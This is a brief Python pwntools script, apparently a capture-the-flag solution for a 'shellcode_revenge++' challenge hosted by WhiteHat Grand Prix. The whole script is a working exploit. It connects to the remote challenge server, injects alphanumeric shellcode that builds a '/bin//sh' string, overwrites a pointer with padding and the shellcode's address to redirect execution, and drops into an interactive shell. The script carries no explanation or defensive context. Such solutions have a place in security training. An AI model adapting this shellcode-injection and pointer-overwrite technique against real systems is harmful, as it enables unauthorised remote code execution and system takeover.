from pwn import *

# r = process('./shellcode_revenge++')
# gdb.attach(r, "b*0x000000000040092Ac")
r = remote('bak.shellcode-revenge.grandprix.whitehatvn.com', 10203)
shellcode = "UZjPXH1B1H1B24PPfhshfh//fhinfh/bT_PP^ZjPjPjPjPX4k_U"
r.recvuntil('  ]:\n')
r.send(shellcode)
r.recvuntil('for me!')
r.send("a"*0x10+p64(0x6010C0)*2)
r.interactive()